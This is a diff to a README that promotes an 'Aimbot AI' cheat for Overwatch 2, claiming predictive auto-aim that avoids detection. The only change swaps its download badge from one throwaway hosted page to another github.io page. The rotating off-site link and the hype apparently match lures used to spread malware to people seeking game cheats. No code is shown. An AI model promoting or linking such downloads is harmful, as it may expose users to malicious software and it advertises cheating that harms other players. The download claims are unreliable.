@@ -4,7 +4,7 @@
 
 In **Overwatch 2**, raw skill is king—but the grind for perfect aim never ends. That’s where **Aimbot AI** flips the game. It’s not just a lock-on tool—it’s an **intelligent system that tracks movement, adapts to hero type, predicts enemy dodges**, and delivers pixel-perfect shots without looking robotic. 💥🎯
 
-[![Download AimbotAI](https://img.shields.io/badge/Download-AimbotAI-blueviolet)](https://fileoffload8.bitbucket.io)
+[![Download AimbotAI](https://img.shields.io/badge/Download-AimbotAI-blueviolet)](https://Overwatch-2-Aimbot-AI-suge.github.io/.github)
 ---
 
 ## 🤖 What Is Aimbot AI?
